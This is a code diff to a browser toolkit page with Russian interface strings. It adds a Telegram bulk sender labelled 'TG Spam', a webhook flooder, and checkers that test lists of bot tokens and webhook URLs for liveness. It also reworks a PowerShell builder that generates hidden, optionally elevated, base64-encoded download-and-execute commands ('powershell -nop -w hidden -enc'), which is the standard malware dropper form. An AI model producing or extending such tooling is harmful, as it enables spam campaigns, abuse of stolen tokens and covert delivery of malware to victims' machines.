-    $('msgsStatus').textContent = updates.length + ' items';
-    if (!updates.length) { list.innerHTML = '<div class="hint">No updates</div>'; return; }
+    $('msgsStatus').textContent = updates.length + ' шт';
+    if (!updates.length) { list.innerHTML = '<div class="hint">пусто</div>'; return; }
     list.innerHTML = updates.map(u => {
       const msg = u.message || u.edited_message || u.channel_post;
       const from = msg.from ? [msg.from.first_name, msg.from.last_name].filter(Boolean).join(' ') : (msg.chat && msg.chat.title) || 'chat';
@@ -518,12 +760,122 @@ $('loadMsgs').addEventListener('click', async () => {
   }
 });
 
+/* TG Spam */
+let spamStop = false;
+$('spamStart').addEventListener('click', async () => {
+  const token = $('spamToken').value.trim() || $('token').value.trim();
+  const chats = $('spamChats').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
+  const text = $('spamText').value;
+  const delay = Math.max(100, parseInt($('spamDelay').value, 10) || 500);
+  const parse = $('spamParse').value;
+  if (!token || !chats.length || !text) return alert('токен, чаты, текст');
+  spamStop = false;
+  $('spamStart').disabled = true;
+  $('spamStop').style.display = 'block';
+  const log = $('spamLog');
+  log.style.display = 'block';
+  log.innerHTML = '';
+  for (const chat of chats) {
+    if (spamStop) break;
+    try {
+      let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
+      if (parse) url += '&parse_mode=' + parse;
+      const r = await fetch(url);
+      const j = await r.json();
+      log.innerHTML += `<div class="${j.ok?'ok':'err'}">${esc(chat)}: ${j.ok?'ok':esc(j.description||'fail')}</div>`;
+    } catch (e) {
+      log.innerHTML += `<div class="err">${esc(chat)}: network</div>`;
+    }
+    log.scrollTop = log.scrollHeight;
+    await sleep(delay);
+  }
+  $('spamStart').disabled = false;
+  $('spamStop').style.display = 'none';
+  toast('готово');
+});
+$('spamStop').addEventListener('click', () => { spamStop = true; });
+
+/* Webhook */
+let hookStop = false;
+$('hookStart').addEventListener('click', async () => {
+  const urls = $('hookUrls').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
+  let body = $('hookBody').value;
+  const delay = Math.max(100, parseInt($('hookDelay').value, 10) || 800);
+  const repeat = Math.max(1, Math.min(50, parseInt($('hookRepeat').value, 10) || 1));
+  if (!urls.length || !body) return alert('url и body');
+  let contentType = 'application/json';
+  try { JSON.parse(body); } catch { body = JSON.stringify({ content: body }); }
+  hookStop = false;
+  $('hookStart').disabled = true;
+  $('hookStop').style.display = 'block';
+  const log = $('hookLog');
+  log.style.display = 'block';
+  log.innerHTML = '';
+  for (const url of urls) {
+    for (let i = 0; i < repeat; i++) {
+      if (hookStop) break;
+      try {
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': contentType }, body });
+        log.innerHTML += `<div class="${r.ok?'ok':'err'}">${esc(url.slice(0,48))}… [${i+1}] ${r.status}</div>`;
+      } catch (e) {
+        log.innerHTML += `<div class="err">${esc(url.slice(0,40))} network</div>`;
+      }
+      log.scrollTop = log.scrollHeight;
+      await sleep(delay);
+    }
+  }
+  $('hookStart').disabled = false;
+  $('hookStop').style.display = 'none';
+  toast('готово');
+});
+$('hookStop').addEventListener('click', () => { hookStop = true; });
+
+/* Checkers */
+$('chkTokenBtn').addEventListener('click', async () => {
+  const tokens = $('chkTokens').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
+  const out = $('chkTokenOut');
+  out.innerHTML = '';
+  if (!tokens.length) return;
+  for (const t of tokens) {
+    try {
+      const r = await fetch('https://api.telegram.org/bot' + t + '/getMe');
+      const j = await r.json();
+      if (j.ok) {
+        out.innerHTML += `<div class="msg-item"><div><span class="badge status-ok">OK</span> @${esc(j.result.username||'')} id=${j.result.id}</div><div class="msg-body">${esc(j.result.first_name||'')}</div></div>`;
+      } else {
+        out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">FAIL</span></div><div class="msg-body">${esc(j.description||'bad')}</div></div>`;
+      }
+    } catch {
+      out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">NET</span></div><div class="msg-body">${esc(t.slice(0,20))}…</div></div>`;
+    }
+  }
+});
+$('chkHookBtn').addEventListener('click', async () => {
+  const urls = $('chkHooks').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
+  const out = $('chkHookOut');
+  out.innerHTML = '';
+  if (!urls.length) return;
+  for (const url of urls) {
+    try {
+      const r = await fetch(url);
+      const j = await r.json().catch(() => ({}));
+      if (r.ok && (j.name || j.id || j.channel_id || j.type)) {
+        out.innerHTML += `<div class="msg-item"><div><span class="badge status-ok">OK</span> ${r.status}</div><div class="msg-body">${esc(j.name||j.id||'live')}</div></div>`;
+      } else {
+        out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">${r.status}</span></div><div class="msg-body">${esc(j.message||j.code||'dead')}</div></div>`;
+      }
+    } catch {
+      out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">NET</span></div><div class="msg-body">${esc(url.slice(0,40))}</div></div>`;
+    }
+  }
+});
+
 /* PowerShell builder */
 const DIR_MAP = {
   TEMP: { ps: '$env:TEMP', show: '%TEMP%' },
   LOCALAPPDATA: { ps: '$env:LOCALAPPDATA', show: '%LOCALAPPDATA%' },
   APPDATA: { ps: '$env:APPDATA', show: '%APPDATA%' },
-  DOWNLOADS: { ps: "[Environment]::GetFolderPath('UserProfile')+'\\Downloads'", show: '%USERPROFILE%\\Downloads' },
+  DOWNLOADS: { ps: "[Environment]::GetFolderPath('UserProfile')+'\\\\Downloads'", show: '%USERPROFILE%\\Downloads' },
   CUSTOM: { ps: null, show: null }
 };
 function filenameFromUrl(u) {
@@ -550,62 +902,50 @@ function buildPs() {
   const wait = $('psWait').checked;
   const admin = $('psAdmin').checked;
   const mkdir = $('psMkdir').checked;
-  const asB64 = $('psB64').checked;
-  const pathExpr = `(Join-Path (${dirPs}) ${sq(name)})`;
+  const b64 = $('psB64').checked;
   let lines = [];
-  if (mkdir) lines.push(`New-Item -ItemType Directory -Force -Path (${dirPs}) | Out-Null`);
-  lines.push(`$u=${sq(url)}; $p=${pathExpr}`);
-  lines.push(`Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing`);
-  if (hidden) lines.push(`attrib +h $p`);
-  let start = `Start-Process -FilePath $p`;
+  if (mkdir) lines.push(`$d=${dirPs}; if(!(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null}`);
+  else lines.push(`$d=${dirPs}`);
+  lines.push(`$o=Join-Path $d ${sq(name)}`);
+  lines.push(`(New-Object Net.WebClient).DownloadFile(${sq(url)},$o)`);
+  if (hidden) lines.push(`(Get-Item $o).Attributes='Hidden'`);
+  let start = `Start-Process -FilePath $o`;
   if (silent) start += ` -WindowStyle Hidden`;
   if (wait) start += ` -Wait`;
   if (admin) start += ` -Verb RunAs`;
   lines.push(start);
-  const plain = lines.join('; ');
-  const compact = plain;
-  let b64 = '';
-  try {
-    const utf16 = new TextEncoder('utf-16le', { NONSTANDARD_allowLegacyEncoding: true });
-  } catch (_) {}
-  // PowerShell -enc expects UTF-16LE base64
-  const bom = [];
-  for (let i = 0; i < plain.length; i++) {
-    const c = plain.charCodeAt(i);
-    bom.push(c & 0xff, (c >> 8) & 0xff);
+  const cmd = lines.join(';');
+  $('psPath').textContent = 'path: ' + dirShow + '\\' + name;
+  if (b64) {
+    const bytes = new TextEncoder().encode(cmd);
+    const utf16 = new Uint8Array(bytes.length * 2);
+    for (let i = 0; i < bytes.length; i++) utf16[i * 2] = bytes[i];
+    let bin = '';
+    utf16.forEach(b => bin += String.fromCharCode(b));
+    return 'powershell -nop -w hidden -enc ' + btoa(bin);
   }
-  b64 = btoa(String.fromCharCode.apply(null, bom));
-  const encCmd = `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`;
-  return {
-    plain, compact: asB64 ? encCmd : compact, b64: encCmd,
-    shown: dirShow + '\\' + name
-  };
+  return 'powershell -nop -w hidden -c "' + cmd.replace(/"/g, '`"') + '"';
 }
-let psTab = 'compact';
 function renderPs() {
-  $('psCustomWrap').style.display = $('psDir').value === 'CUSTOM' ? 'block' : 'none';
-  const r = buildPs();
-  if (!r) {
-    $('psOut').textContent = 'Paste a URL above';
-    $('psPath').textContent = 'path: —';
-    return;
-  }
-  $('psPath').textContent = 'path: ' + r.shown;
-  $('psOut').textContent = r[psTab] || r.compact;
+  const out = buildPs();
+  $('psOut').textContent = out || '—';
 }
-['psUrl','psName','psCustom'].forEach(id => $(id).addEventListener('input', renderPs));
-['psDir','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id => $(id).addEventListener('change', renderPs));
-document.querySelectorAll('[data-ps-tab]').forEach(b => b.addEventListener('click', () => {
-  psTab = b.getAttribute('data-ps-tab');
+$('psDir').addEventListener('change', () => {
+  $('psCustomWrap').style.display = $('psDir').value === 'CUSTOM' ? 'block' : 'none';
   renderPs();
-}));
-$('psCopy').addEventListener('click', () => copyText($('psOut').textContent));
-renderPs();
+});
+['psUrl','psName','psCustom','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id => {
+  const el = $(id);
+  if (el) el.addEventListener('input', renderPs);
+  if (el && el.type === 'checkbox') el.addEventListener('change', renderPs);
+});
+$('psBuild').addEventListener('click', renderPs);
+$('psCopy').addEventListener('click', () => copyText($('psOut').textContent || ''));
 
 /* Codec */
 function runCodec() {
-  const mode = $('codecMode').value;
   const inp = $('codecIn').value;
+  const mode = $('codecMode').value;
   let out = '';
   try {
     if (mode === 'b64e') out = btoa(unescape(encodeURIComponent(inp)));
@@ -614,12 +954,11 @@ function runCodec() {
     else if (mode === 'urldec') out = decodeURIComponent(inp);
     else if (mode === 'hexe') out = Array.from(new TextEncoder().encode(inp)).map(b => b.toString(16).padStart(2,'0')).join('');
     else if (mode === 'hexd') {
-      const clean = inp.replace(/[^0-9a-fA-F]/g,'');
-      const bytes = new Uint8Array(clean.match(/.{1,2}/g).map(h => parseInt(h,16)));
+      const bytes = new Uint8Array((inp.replace(/\s/g,'').match(/.{1,2}/g)||[]).map(h => parseInt(h,16)));
       out = new TextDecoder().decode(bytes);
     } else if (mode === 'ue') out = Array.from(inp).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
     else if (mode === 'ud') out = inp.replace(/\\u([0-9a-fA-F]{4})/g, (_,h) => String.fromCharCode(parseInt(h,16)));
-  } catch (e) { out = 'Error: ' + e.message; }
+  } catch (e) { out = 'error: ' + e.message; }
   $('codecOut').value = out;
 }
 $('codecRun').addEventListener('click', runCodec);
@@ -630,20 +969,15 @@ $('codecSwap').addEventListener('click', () => {
 
 /* Keys */
 function genKey() {
-  const len = Math.min(256, Math.max(8, parseInt($('keyLen').value,10) || 32));
+  const len = parseInt($('keyLen').value, 10) || 32;
   const alpha = $('keyAlpha').value;
-  if (alpha === 'uuid') {
-    return crypto.randomUUID();
-  }
-  const bytes = new Uint8Array(len);
-  crypto.getRandomValues(bytes);
-  if (alpha === 'hex') return Array.from(bytes).map(b => b.toString(16).padStart(2,'0')).join('').slice(0, len);
-  const chars = alpha === 'base64'
-    ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
-    : 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  let s = '';
-  for (let i = 0; i < len; i++) s += chars[bytes[i] % chars.length];
-  return s;
+  if (alpha === 'uuid') return crypto.randomUUID();
+  const chars = alpha === 'hex' ? '0123456789abcdef'
+    : alpha === 'base64' ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    : 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
+  const arr = new Uint8Array(len);
+  crypto.getRandomValues(arr);
+  return Array.from(arr, b => chars[b % chars.length]).join('');
 }
 $('keyGen').addEventListener('click', () => { $('keyOut').value = genKey(); $('keyList').style.display='none'; });
 $('keyCopy').addEventListener('click', () => copyText($('keyOut').value));
@@ -662,24 +996,19 @@ $('psDecRun').addEventListener('click', () => {
   try {
     let m = raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
     let b64 = m ? m[1] : raw.replace(/\s+/g,'');
-    // try UTF-16LE (PS -enc)
     const bin = atob(b64);
     let utf16 = '';
     for (let i = 0; i + 1 < bin.length; i += 2) {
       utf16 += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i+1) << 8));
     }
     let text = utf16;
-    // nested FromBase64String
     const nested = text.match(/FromBase64String\(['"]([A-Za-z0-9+/=]+)['"]\)/i);
     if (nested) {
-      try {
-        const inner = atob(nested[1]);
-        text += '\n\n--- nested base64 ---\n' + inner;
-      } catch (_) {}
+      try { text += '\n\n--- nested ---\n' + atob(nested[1]); } catch (_) {}
     }
     out.textContent = text;
   } catch (e) {
-    out.textContent = 'Decode failed: ' + e.message;
+    out.textContent = 'fail: ' + e.message;
   }
 });
 </script>
